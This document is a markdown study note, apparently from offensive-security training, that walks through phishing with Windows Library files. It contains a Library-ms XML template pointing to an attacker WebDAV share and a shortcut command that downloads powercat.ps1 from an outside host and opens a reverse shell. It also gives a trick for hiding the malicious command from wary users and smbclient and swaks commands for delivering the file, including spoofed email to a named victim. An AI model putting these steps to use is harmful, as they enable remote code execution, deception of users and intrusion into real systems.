# Windows Library Files

1. Start WebDAV server

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

2. Use vscode and anme name it `config.Library-ms`
3. Paste the code and chagne the url to attacker IP

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://CHANGEME</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

4. Use this comand to get and execute powercat reverse shell by creating Shortcut file with name `automatic_configuration`

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```

> If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.

5. On our Kali machine, let's start a Python3 web server on port 8000 where powercat.ps1 is located and start a Netcat listener on port 4444.

> Instead of using a Python3 web server to serve Powercat, we could also host it on the WebDAV share. However, as our WebDAV share is writable, AV and other security solutions could remove or quarantine our payload. If we configure the WebDAV share as read-only, we'd lose a great method of transferring files from target systems. Throughout this course, we'll use a Python3 web server to serve our payload for attacks utilizing Windows Library files.

6. To make it seems genuine we can write something to make the user click the file.
7. Transfer through SMBclient

```
smbclient //192.168.50.195/share -c 'put config.Library-ms'
```

Send through SMTP or Mail using \[\[Swaks]]

```
swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.234.199 --body body.txt --header "Subject: Problems" --suppress-data
```
